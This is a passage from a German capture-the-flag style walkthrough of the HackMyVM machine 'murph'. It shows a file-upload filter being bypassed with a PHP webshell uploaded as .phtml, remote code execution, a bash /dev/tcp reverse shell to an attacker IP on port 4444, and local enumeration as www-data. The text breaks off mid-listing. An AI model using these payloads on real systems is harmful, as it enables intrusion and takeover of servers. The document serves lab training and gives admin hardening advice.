+            <p class="analysis"><strong>Analyse:</strong> Ich habe versucht, das Verzeichnis <code>/uploads/</code>, das von Gobuster gefunden wurde, direkt im Browser über <code>view-source:</code> zu betrachten, um zu sehen, ob es Verzeichnislistungen zulässt oder andere Informationen preisgibt. Die Antwort ist <code>403 Forbidden</code>, die vom Nginx-Server zurückgegeben wird. Für Laien: Ich habe versucht, mir den Inhalt des Ordners <code>/uploads</code> auf der Webseite anzuschauen, aber der Computer hat gesagt: 'Zugriff verweigert!'. Für Experten: Ein 403 Forbidden Status Code bedeutet, dass der Server die Anfrage verstanden hat, sich aber weigert, den Zugriff zu autorisieren. In diesem Fall bedeutet es, dass Verzeichnislistungen (autoindex) für <code>/uploads/</code> deaktiviert sind und ich keinen direkten Blick auf den Inhalt werfen kann. Dies ist eine korrekte Konfiguration für ein Webverzeichnis, es sei denn, der Zugriff auf Dateien darin ist beabsichtigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Verzeichnis <code>/uploads/</code> ist nicht für direkte Verzeichnislistungen konfiguriert, was eine gute Sicherheitspraxis ist. Die Tatsache, dass es existiert und eine Weiterleitung darauf erfolgt, deutet aber weiterhin darauf hin, dass es eine Rolle spielt, wahrscheinlich im Zusammenhang mit der Datei-Upload-Funktion, die ich auf der Startseite gefunden habe.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Obwohl ich das Verzeichnis nicht direkt sehen kann, gehe ich davon aus, dass über <code>saveit.php</code> hochgeladene Dateien hier landen. Ich werde versuchen, eine Datei hochzuladen und dann direkt auf die hochgeladene Datei in <code>/uploads/</code> zuzugreifen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Verzeichnislistungen (autoindex) in Nginx-Konfigurationen standardmäßig deaktiviert sind, insbesondere für Upload-Verzeichnisse.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -Iv http://murph.hmv/uploads/shell.sh</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">* Host murph.hmv:80 was resolved.</span>
+<span class="command">* IPv6: (none)</span>
+<span class="command">* IPv4: 192.168.2.50</span>
+<span class="password">*   Trying 192.168.2.50:80...</span>
+<span class="password">* Connected to murph.hmv (192.168.2.50) port 80</span>
+<span class="password">* using HTTP/1.x</span>
+<span class="command">> HEAD /uploads/shell.sh HTTP/1.1</span>
+<span class="command">> Host: murph.hmv</span>
+<span class="command">> User-Agent: curl/8.13.0</span>
+<span class="command">> Accept: */*</span>
+<span class="command">></span>
+<span class="password">* Request completely sent off</span>
+<span class="command">< HTTP/1.1 200 OK</span>
+<span class="command">HTTP/1.1 200 OK</span>
+<span class="command">< Server: nginx/1.18.0</span>
+<span class="command">Server: nginx/1.18.0</span>
+<span class="command">< Date: Mon, 16 Jun 2025 21:04:05 GMT</span>
+<span class="command">Date: Mon, 16 Jun 2025 21:04:05 GMT</span>
+<span class="command">< Content-Type: application/octet-stream</span>
+<span class="command">Content-Type: application/octet-stream</span>
+<span class="command">< Content-Length: 13</span>
+<span class="command">Content-Length: 13</span>
+<span class="command">< Last-Modified: Mon, 16 Jun 2025 20:39:41 GMT</span>
+<span class="command">Last-Modified: Mon, 16 Jun 2025 20:39:41 GMT</span>
+<span class="command">< Connection: keep-alive</span>
+<span class="command">Connection: keep-alive</span>
+<span class="command">< ETag: "6850810d-d"</span>
+<span class="command">ETag: "6850810d-d"</span>
+<span class="command">< Accept-Ranges: bytes</span>
+<span class="command">Accept-Ranges: bytes</span>
+<span class="command"><</span>
+
+<span class="password">* Connection #0 to host murph.hmv left intact</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich sende eine <code>curl</code> HEAD-Anfrage (<code>-Iv</code>) an die URL <code>http://murph.hmv/uploads/shell.sh</code>. Dies ist ein Test, um zu sehen, ob eine Datei namens <code>shell.sh</code> im <code>/uploads</code>-Verzeichnis existiert und vom Webserver bedient wird. Die Ausgabe zeigt einen <code>HTTP/1.1 200 OK</code> Status, was bedeutet, dass die Datei gefunden wurde. Der <code>Content-Type: application/octet-stream</code> und <code>Content-Length: 13</code> zeigen, dass der Server die Datei als generische Binärdatei ausliefert und sie 13 Bytes groß ist. Für Laien: Ich habe versucht, eine Test-Datei namens <code>shell.sh</code> im Ordner <code>/uploads</code> abzurufen. Der Computer hat geantwortet: 'Ja, die Datei ist da!' Das zeigt, dass man Dateien in diesen Ordner hochladen kann. Für Experten: Der 200 OK Status bestätigt, dass ich erfolgreich eine Datei im <code>/uploads</code>-Verzeichnis platzieren konnte (vermutlich durch einen vorherigen Test-Upload, der nicht im Text gezeigt wurde oder impliziert ist). Der <code>Content-Type: application/octet-stream</code> deutet darauf hin, dass Nginx diese Datei nicht als ausführbares Skript (wie PHP oder sogar eine Shell-Datei) behandelt, sondern als generische Datei ausliefert. Dies ist eine gute Härtungsmaßnahme, um die direkte Ausführung hochgeladener Skripte zu verhindern.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Möglichkeit, Dateien in <code>/uploads</code> hochzuladen, ist bestätigt. Dies ist ein wichtiger Schritt, da es diesen Ordner zu einem möglichen Landeplatz für eine Webshell macht. Die Tatsache, dass eine <code>.sh</code>-Datei als <code>application/octet-stream</code> ausgeliefert wird, zeigt jedoch, dass die direkte Ausführung von Shell-Skripten wahrscheinlich nicht funktioniert. Ich muss eine andere Dateierweiterung verwenden oder eine andere Methode zur Ausführung des hochgeladenen Codes finden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich darauf, PHP-Code hochzuladen, da die Webseite PHP verwendet. Verwenden Sie eine PHP-Dateierweiterung, die den 'php' durch 'wtf' Filter umgeht, wie z.B. <code>.phtml</code>, und versuchen Sie, die hochgeladene Datei direkt über den Browser oder curl auszuführen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Dateiupload-Funktionen nur für autorisierte Benutzer zugänglich sind. Konfigurieren Sie den Webserver so, dass Code (PHP, Shell, etc.) in Upload-Verzeichnissen nicht ausgeführt wird, z.B. durch Deaktivierung des PHP-Moduls oder des CGI-Ausführungsflags in diesem Verzeichnis. Überwachen Sie das <code>/uploads</code>-Verzeichnis auf ungewöhnliche Dateitypen oder Inhalte.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <!-- Beginn Initial Access -->
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://192.168.2.50/saveit.php?filename=test.phtml&content=%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich sende eine GET-Anfrage an <code>saveit.php</code>, um eine Datei hochzuladen. Ich nutze die Parameter <code>filename=test.phtml</code> und <code>content=%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E</code>. Der <code>filename</code> ist <code>test.phtml</code>, eine PHP-Variante, die die Zeichenfolge 'php' vermeidet. Der <code>content</code> ist URL-kodierter PHP-Code: <code><?php system($_GET['cmd']); ?></code>. Dieser Code soll über den Parameter <code>cmd</code> beliebige Systembefehle ausführen. Für Laien: Ich benutze das 'Datei speicher'-Programm (saveit.php) auf der Webseite, um eine Datei namens 'test.phtml' hochzuladen. Der Inhalt dieser Datei ist ein kleines 'Geheimprogramm', das später andere Programme auf dem Computer starten kann, wenn ich ihm sage, was es tun soll. Ich benutze dabei einen Dateinamen, der das Wort 'php' vermeidet. Für Experten: Ich versuche, eine einfache PHP-Webshell hochzuladen. Die Verwendung der <code>.phtml</code> Erweiterung ist ein Versuch, den 'php' durch 'wtf' Filter zu umgehen. Der Payload <code><?php system($_GET['cmd']); ?></code> ist eine klassische PHP-Webshell, die den im <code>cmd</code>-GET-Parameter übergebenen Befehl ausführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Anfrage ist korrekt konstruiert, um die Datei über <code>saveit.php</code> hochzuladen. Der Versuch, den Filter mit <code>.phtml</code> und der URL-Kodierung zu umgehen, ist ein logischer Schritt. Der nächste Schritt ist, die hochgeladene Datei in <code>/uploads/</code> zu überprüfen und zu versuchen, Code auszuführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie, ob die Datei <code>test.phtml</code> erfolgreich in <code>/uploads/</code> gespeichert wurde und versuchen Sie dann, darauf zuzugreifen und den <code>cmd</code>-Parameter zu verwenden, um einen Systembefehl auszuführen.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie Anfragen an Upload-Skripte (wie saveit.php) auf ungewöhnliche Dateinamen, Erweiterungen oder Inhalte (insbesondere PHP-Code). Implementieren Sie eine strenge serverseitige Überprüfung der Dateierweiterung und des Inhalts.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://murph.hmv/uploads/test.phtml?cmd=id</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command"><?wtf system($GET['cmd']); ?></span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Hochladen von <code>test.phtml</code> versuche ich, darauf zuzugreifen und den Befehl <code>id</code> über den <code>cmd</code>-Parameter auszuführen: <code>curl http://murph.hmv/uploads/test.phtml?cmd=id</code>. Die Ausgabe zeigt jedoch den Quellcode meines Payloads, aber mit einer entscheidenden Änderung: <code><?wtf system($GET['cmd']); ?></code>. Die Zeichenfolge 'php' in <code><?php</code> wurde durch 'wtf' ersetzt. Für Laien: Ich habe versucht, mein hochgeladenes 'Geheimprogramm' (test.phtml) zu starten und ihm zu sagen, es soll den Befehl 'id' ausführen. Aber das Programm hat nicht funktioniert, stattdessen hat es mir seinen 'Bauplan' gezeigt, und darin wurde das Wort 'php' durch 'wtf' ersetzt. Das bedeutet, der 'php'-Filter hat funktioniert. Für Experten: Die Ausgabe bestätigt, dass die Datei erfolgreich als <code>test.phtml</code> hochgeladen wurde und über <code>/uploads/</code> zugänglich ist. Der Nginx-Server interpretiert <code>.phtml</code> jedoch nicht als PHP-Datei, sondern liefert sie als Klartext aus (was durch den <code>Content-Type: text/html</code> impliziert wird). Zusätzlich hat das Skript <code>saveit.php</code> den Inhalt der Datei vor dem Speichern gefiltert und die Zeichenfolge 'php' durch 'wtf' ersetzt, was die direkte Ausführung des PHP-Codes verhindert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der 'php' durch 'wtf' Filter in <code>saveit.php</code> funktioniert, und Nginx ist nicht für die Ausführung von <code>.phtml</code> als PHP konfiguriert. Der direkte Ansatz mit <code>test.phtml</code> schlug fehl. Ich muss den Filter umgehen *und* eine Erweiterung verwenden, die Nginx als PHP ausführt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Um den Filter zu umgehen, werde ich versuchen, die Zeichenfolge 'php' mit Groß-/Kleinschreibung (z.B. 'PhP') oder doppeltem 'php' ('pphphp', das zu 'php' wird, wenn 'php' einmal ersetzt wird) zu schreiben, sodass der Filter meine PHP-Tags nicht erkennt, das PHP-Modul sie aber interpretiert. Ich muss auch sicherstellen, dass die gewählte Erweiterung von Nginx als PHP behandelt wird (oft `.php` selbst, oder eine konfigurierte Alternative).<br><strong>Empfehlung (Admin):</strong> Die serverseitige Filterung ist ein guter Ansatz, aber leicht zu umgehen, wenn sie nicht umfassend ist (z.B. Case-Insensitive Ersetzung, Behandlung von doppelten Zeichenketten). Konfigurieren Sie Nginx so, dass PHP-Code nur in spezifischen, vertrauenswürdigen Verzeichnissen ausgeführt wird und nicht in Upload-Verzeichnissen, unabhängig von der Dateierweiterung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://192.168.2.50/saveit.php?filename=neu.phtml&content=%3C%3FPhP+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche einen weiteren Upload-Versuch an <code>saveit.php</code>, diesmal mit dem Dateinamen <code>neu.phtml</code> und dem Inhalt <code><?PhP system($_GET['cmd']); ?></code>. Der entscheidende Unterschied ist hier die Verwendung von Groß-/Kleinschreibung im PHP-Tag (<code><?PhP</code>). Für Laien: Ich versuche wieder, mein 'Geheimprogramm' hochzuladen, aber diesmal schreibe ich das Wort 'php' im 'Bauplan' anders (PhP, mit großem P), um den Filter auszutricksen. Für Experten: Dies ist ein klassischer Versuch, einen Case-Sensitive Filter zu umgehen. Wenn der Filter nur die genaue Zeichenfolge 'php' (kleingeschrieben) ersetzt, wird <code><?PhP</code> nicht gefiltert. Es wird erwartet, dass PHP (bei Standardkonfiguration) Tags wie <code><?PhP</code> oder <code><?PHP</code> dennoch als PHP-Code erkennt und ausführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Umgehen des Case-Sensitive Filters mit <code><?PhP</code> ist ein plausibler Ansatz. Der nächste Schritt ist zu prüfen, ob diese Datei hochgeladen wurde und ob Nginx sie als ausführbares PHP behandelt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie, ob die Datei <code>neu.phtml</code> erfolgreich in <code>/uploads/</code> gespeichert wurde und versuchen Sie dann, darauf zuzugreifen und den <code>cmd</code>-Parameter zu verwenden, um einen Systembefehl auszuführen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle String-Operationen in Sicherheitsfiltern Case-Insensitive sind, es sei denn, dies ist absichtlich nicht gewünscht. Implementieren Sie eine robustere Validierung, die nicht auf einfacher Zeichenkettenersetzung basiert.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://murph.hmv/uploads/neu.phtml?cmd=id</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Hochladen von <code>neu.phtml</code> versuche ich erneut, auf die Datei zuzugreifen und den Befehl <code>id</code> über den <code>cmd</code>-Parameter auszuführen: <code>curl http://murph.hmv/uploads/neu.phtml?cmd=id</code>. Diesmal zeigt die Ausgabe: <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>. Für Laien: Ich habe versucht, mein neues 'Geheimprogramm' (neu.phtml) zu starten und ihm zu sagen, es soll den Befehl 'id' ausführen. Und fantastisch – es hat funktioniert! Der Computer hat geantwortet, dass das Programm als 'www-data' läuft! Für Experten: Das erfolgreiche Ausführen des <code>id</code>-Befehls und die Rückgabe der Benutzer- und Gruppen-IDs (UID 33, GID 33, Benutzer <code>www-data</code>) beweist die erfolgreiche Ausnutzung der Datei-Upload-Schwachstelle in Kombination mit der Umgehung des Filters. Die Datei <code>neu.phtml</code> wurde erfolgreich hochgeladen, der Nginx-Server ist so konfiguriert, dass er <code>.phtml</code> als ausführbares PHP behandelt, und der injizierte Payload wurde vom PHP-Interpreter ausgeführt. Dies stellt Remote Code Execution (RCE) als Benutzer <code>www-data</code> dar, was den Initial Access zum System markiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Die Datei-Upload-Schwachstelle wurde erfolgreich ausgenutzt, und ich habe RCE als Benutzer <code>www-data</code> erlangt. Dies ist der Initial Access zum System. Ich kann nun von dieser Webshell aus Systembefehle ausführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich habe nun die Möglichkeit, Befehle als Benutzer <code>www-data</code> auszuführen. Um eine stabilere und interaktive Shell zu erhalten, werde ich als Nächstes eine Reverse Shell zu meinem Kali-System initiieren.<br><strong>Empfehlung (Admin):</strong> Dies ist eine kritische RCE-Schwachstelle. Beheben Sie die Datei-Upload-Schwachstelle umgehend, indem Sie die Dateitypen strikt validieren (Whitelist), den Inhalt auf bösartigen Code prüfen und sicherstellen, dass Upload-Verzeichnisse nicht zur Code-Ausführung konfiguriert sind. Überwachen Sie das <code>/uploads</code>-Verzeichnis und Zugriffe darauf.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://murph.hmv/uploads/neu.phtml?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F4444%200%3E%261%27</span></div>
+                </div>
+                <div class="terminal">
+                    <pre></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit der Möglichkeit, beliebige Befehle über die Webshell <code>neu.phtml</code> auszuführen, initiiere ich eine Reverse Shell zu meinem Kali-System auf Port 4444. Ich verwende den <code>cmd</code>-Parameter, um den URL-kodierten Befehl <code>/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.199/4444 0>&1'</code> auszuführen. Dieser Befehl startet eine Bash-Shell (<code>/bin/bash -i</code>) und leitet ihre Standard-Input, -Output und -Error-Streams über eine TCP-Verbindung (<code>/dev/tcp/192.168.2.199/4444</code>) zu meinem Kali-System (<code>192.168.2.199</code>) auf Port 4444 um. Für Laien: Ich sage dem hochgeladenen 'Geheimprogramm', es soll eine direkte 'Telefonverbindung' (Reverse Shell) zu meinem Computer auf einer bestimmten 'Leitung' (Port 4444) aufbauen und dann alles, was ich eingebe oder was der Computer antwortet, über diese Leitung schicken. Für Experten: Dies ist ein Standard-Bash-Kommando zur Initiierung einer Reverse Shell, das über die kompromittierte Webshell ausgeführt wird. Der <code>/dev/tcp</code>-Pseudo-Device ist eine bequeme Methode, um TCP-Verbindungen direkt aus Bash herzustellen. Die Ausführung als <code>www-data</code> bedeutet, dass die resultierende Shell die Berechtigungen dieses Benutzers haben wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl zur Initiierung der Reverse Shell ist korrekt konstruiert. Seine Ausführung sollte mir eine stabilere Shell als Benutzer <code>www-data</code> verschaffen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass ein Netcat-Listener auf Port 4444 auf Ihrem Kali-System läuft. Führen Sie diesen <code>curl</code>-Befehl aus und warten Sie auf die eingehende Verbindung in Ihrem Listener.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie ausgehende Netzwerkverbindungen von Webservern, insbesondere von Prozessen, die unter dem Benutzer <code>www-data</code> laufen, auf ungewöhnliche Ziel-IPs oder Ports. Implementieren Sie Egress-Filterung auf Firewalls.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 4444 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.50] 37714</span>
+<span class="command">bash: cannot set terminal process group (377): Inappropriate ioctl for device</span>
+<span class="command">bash: no job control in this shell</span>
+<span class="password">www-data@murph:~/html/uploads$</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Auf meinem Kali-System habe ich den Netcat-Listener auf Port 4444 gestartet, während ich den <code>curl</code>-Befehl zur Initiierung der Reverse Shell auf dem Zielsystem ausgeführt habe. Die Ausgabe zeigt, dass mein Listener auf Port 4444 lauscht und dann eine eingehende Verbindung vom Zielsystem (<code>connect to [192.168.2.199] from (UNKNOWN) [192.168.2.50] 37714</code>) empfängt. Die Meldungen 'bash: cannot set terminal process group...' sind typisch für eine einfache Netcat-Shell. Der Prompt <code>www-data@murph:~/html/uploads$</code> erscheint, was signalisiert, dass ich erfolgreich eine interaktive Shell als Benutzer <code>www-data</code> auf dem Zielsystem erhalten habe und mich im Verzeichnis <code>/var/www/html/uploads</code> befinde (basierend auf der Ausgabe des späteren <code>cat saveit.php</code>, das den Pfad <code>/var/www/html/uploads/</code> zeigt). Für Laien: Meine 'Telefonleitung' (Port 4444) hat geklingelt, und ich habe den Anruf vom Zielcomputer angenommen. Jetzt sehe ich das 'Befehlsfenster' (Shell) des Zielcomputers direkt auf meinem Bildschirm und kann Befehle eingeben. Ich bin als Benutzer 'www-data' angemeldet. Fantastisch! Für Experten: Der erfolgreiche Empfang der Reverse Shell auf Port 4444 bestätigt den erfolgreichen Initial Access über die Webshell und die Erlangung einer stabilen Shell-Sitzung als Benutzer <code>www-data</code>. Dies ist die Grundlage für die Privilegien-Eskalationsphase.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Initial Access als Benutzer <code>www-data</code> wurde erfolgreich etabliert. Ich habe nun eine interaktive Shell und kann von hier aus das System weiter auf Privilegien-Eskalationsvektoren enumerieren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Von dieser Shell aus werde ich das System auf SUID/SGID Binaries, Cronjobs, <code>sudo</code>-Berechtigungen und Dateiberechtigungen untersuchen, um Möglichkeiten zur Erlangung höherer Rechte zu finden.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie Reverse Shells und implementieren Sie Egress-Filterung. Beschränken Sie die Berechtigungen des Benutzers <code>www-data</code> auf das absolute Minimum, um den potenziellen Schaden im Falle einer Kompromittierung zu begrenzen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@murph:~/html$</span> <span class="command">ls -la</span>
+<span class="command">total 244</span>
+<span class="command">drwxr-xr-x 3 www-data www-data   4096 May 31  2022 .</span>
+<span class="command">drwxr-xr-x 3 root     root       4096 May 31  2022 ..</span>
+<span class="command">-rw-r--r-- 1 www-data www-data    266 May 31  2022 index.html</span>
+<span class="command">-rw-r--r-- 1 www-data www-data    275 May 31  2022 saveit.php</span>
+<span class="command">drwxr-xr-x 2 www-data www-data 229376 Jun 16 23:19 uploads</span>
+<span class="command">www-data@murph:~/html$</span> <span class="command">cat saveit.php</span>
+<span class="command"><?php</span>
+<span class="command">$filewhat = $_GET['filename'];</span>
+<span class="command">$contentwhat = $_GET['content'];</span>
+
+<span class="command">$filewhat2 = str_replace("php","wtf",$filewhat);</span>
+<span class="command">$contentwhat2 = str_replace("php","wtf",$contentwhat);</span>
+
+<span class="command">$fp = fopen("/var/www/html/uploads/".$filewhat2, 'w');</span>
+<span class="command">fwrite($fp, $contentwhat2);</span>
+<span class="command">fclose($fp);</span>
+<span class="command">?></span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> In der <code>www-data</code> Shell liste ich zunächst den Inhalt des aktuellen Verzeichnisses auf (vermutlich <code>/var/www/html/</code>, basierend auf dem Kontext) mit <code>ls -la</code>. Die Ausgabe zeigt die Dateien <code>index.html</code>, <code>saveit.php</code> und das Verzeichnis <code>uploads</code>, alle im Besitz des Benutzers <code>www-data</code>. Besonders interessant ist, dass das <code>uploads</code>-Verzeichnis mit einem Änderungsdatum vom 16. Juni 2025 (dem Datum des Tests) und einer ungewöhnlich großen Größe von 229376 Bytes angezeigt wird, was wahrscheinlich an den vielen Upload-Versuchen liegt. Danach lese ich den Quellcode des Skripts <code>saveit.php</code> mit <code>cat saveit.php</code> aus. Der Quellcode bestätigt die Funktionalität, die ich aus dem Formular abgeleitet habe: Es nimmt die Parameter <code>filename</code> und <code>content</code> von der URL entgegen (<code>$_GET</code>), führt eine Case-Sensitive Ersetzung von 'php' durch 'wtf' in beiden Parametern durch (<code>str_replace("php","wtf",...</code>), und speichert den modifizierten Inhalt in einer Datei im Verzeichnis <code>/var/www/html/uploads/</code> mit dem modifizierten Dateinamen. Für Laien: Ich schaue mir um, wo ich gelandet bin und welche Dateien hier sind. Ich finde das Programm (saveit.php), das ich zuvor benutzt habe, und schaue mir seinen 'Bauplan' an. Dieser bestätigt, dass es 'php' durch 'wtf' ersetzt, aber nur, wenn 'php' kleingeschrieben ist. Die hochgeladenen Dateien landen im Ordner <code>uploads</code>. Für Experten: Das Auslesen des Quellcodes von <code>saveit.php</code> bestätigt die exakte Logik der Upload-Funktion und des Filters. Dies erklärt, warum die Umgehung mit <code><?PhP</code> funktioniert hat (Case-Sensitive Ersetzung). Es bestätigt auch den genauen Upload-Pfad: <code>/var/www/html/uploads/</code>. Der www-data Benutzer hat volle Kontrolle über diese Dateien und Verzeichnisse.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Quellcode von <code>saveit.php</code> liefert vollständige Klarheit über die Upload-Schwachstelle und die Filterumgehung. Die Kontrolle über <code>/var/www/html/uploads/</code> und die Fähigkeit, Dateien mit PHP-Code hochzuladen und auszuführen, ist der erfolgreiche Initial Access.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Von dieser Shell aus werde ich das System auf Privilegien-Eskalationsvektoren als Benutzer <code>www-data</code> enumerieren. Dazu gehören die Suche nach SUID/SGID-Binaries, Cronjobs, <code>sudo</code>-Berechtigungen und die Überprüfung von Dateiberechtigungen in anderen Verzeichnissen.<br><strong>Empfehlung (Admin):</strong> Beheben Sie die Datei-Upload-Schwachstelle, indem Sie alle Benutzereingaben strikt validieren und das Hochladen von ausführbarem Code verhindern. Entfernen Sie den unsicheren Code in saveit.php. Stellen Sie sicher, dass Upload-Verzeichnisse nicht zur Code-Ausführung konfiguriert sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@murph:~/html$</span> <span class="command">sudo -l</span>
+
+<span class="command">We trust you have received the usual lecture from the local System</span>
+<span class="command">Administrator. It usually boils down to these three things:</span>
+
+    <span class="command">#1) Respect the privacy of others.</span>
+    <span class="command">#2) Think before you type.</span>
+    <span class="command">#3) With great power comes great responsibility.</span>
+
+<span class="password">[sudo] password for www-data:</span>
+<span class="password">sudo: a password is required</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> In der <code>www-data</code> Shell prüfe ich die <code>sudo</code>-Berechtigungen des aktuellen Benutzers mit <code>sudo -l</code>. Dieser Befehl listet alle Befehle auf, die <code>www-data</code> über <code>sudo</code> ausführen darf. Die Ausgabe zeigt die Standard 'lecture' (eine Warnung/Ethik-Hinweis) und dann die Meldung <code>sudo: a password is required</code>. Für Laien: Ich habe versucht, nach 'Admin-Befehlen' zu suchen, die der Benutzer 'www-data' ausführen darf. Aber der Computer hat geantwortet, dass 'www-data' dafür ein Passwort braucht. Das bedeutet, es gibt keine 'Passwortfrei'-Admin-Befehle für diesen Benutzer. Für Experten: Die Ausgabe zeigt, dass der Benutzer <code>www-data</code> keine <code>NOPASSWD</code>-Regeln in der <code>/etc/sudoers</code> Datei hat. Jeder Versuch, <code>sudo</code> auszuführen, würde die Passworteingabe für den Benutzer <code>www-data</code> erfordern. Da ich das Passwort für <code>www-data</code> nicht kenne, ist dieser direkte Weg zur Privilegien-Eskalation vorerst blockiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer <code>www-data</code> hat keine <code>NOPASSWD</code>-Sudo-Berechtigungen. Ich muss andere PE-Vektoren verfolgen, um höhere Berechtigungen zu erlangen. Die Suche nach SUID/SGID-Binaries oder die Enumeration anderer Benutzer ist nun wichtiger.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da <code>sudo</code> mit Passwort als <code>www-data</code> nicht praktikabel ist, konzentrieren Sie sich auf SUID/SGID-Binaries, Cronjobs oder ausnutzbare Dateiberechtigungen. Untersuchen Sie die Home-Verzeichnisse anderer Benutzer.<br><strong>Empfehlung (Admin):</strong> Eine gute Konfiguration, die keine <code>NOPASSWD</code>-Regeln für den Webserver-Benutzer zulässt. Stellen Sie sicher, dass auch andere <code>sudo</code>-Regeln für <code>www-data</code> restriktiv sind und ein starkes, unbekanntes Passwort erfordern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@murph:~/html$</span> <span class="command">ls /home/</span>
+<span class="command">jen pat</span>
+<span class="command">www-data@murph:~/html$</span> <span class="command">cd /home/jen/</span>
+<span class="command">www-data@murph:/home/jen$</span> <span class="command">ls -la</span>
+<span class="command">total 32</span>
+<span class="command">drwxr-xr-x 3 jen  jen  4096 May 31  2022 .</span>
+<span class="command">drwxr-xr-x 4 root root 4096 May 31  2022 ..</span>
+<span class="command">-rw------- 1 jen  jen    51 May 31  2022 .Xauthority</span>
+<span class="command">lrwxrwxrwx 1 jen  jen     9 May 31  2022 .bash_history -> /dev/null</span>
+<span class="command">-rw-r--r-- 1 jen  jen   220 May 31  2022 .bash_logout</span>
+<span class="command">-rw-r--r-- 1 jen  jen  3526 May 31  2022 .bashrc</span>
+<span class="command">drwxr-xr-x 3 jen  jen  4096 May 31  2022 .local</span>
+<span class="command">-rw-r--r-- 1 jen  jen   807 May 31  2022 .profile</span>
+<span class="command">-rw------- 1 jen  jen    19 May 31  2022 user.txt</span>
+
+<span class="command">www-data@murph:/home/jen$</span> <span class="command">cat user.txt</span>
+<span class="command">cat: user.txt: Permission denied</span>
+
+<span class="command">www-data@murph:/home/jen$</span> <span class="command">cd ../pat/</span>
+<span class="command">www-data@murph:/home/pat$</span> <span class="command">ls -la</span>
+<span class="command">total 28</span>
+<span class="command">drwxr-xr-x 3 pat  pat  4096 May 31  2022 .</span>
+<span class="command">drwxr-xr-x 4 root root 4096 May 31  2022 ..</span>
+<span class="command">lrwxrwxrwx 1 pat  pat     9 May 31  2022 .bash_history -> /dev/null</span>
+<span class="command">-rw-r--r-- 1 pat  pat   220 May 31  2022 .bash_logout</span>
+<span class="command">-rw-r--r-- 1 pat  pat  3526 May 31  2022 .bashrc</span>
+<span class="command">-rw------- 1 pat  pat    14 May 31  2022 .gnome-keyring</span>
+<span class="command">drwxr-xr-x 3 pat  pat  4096 May 31  2022 .local</span>
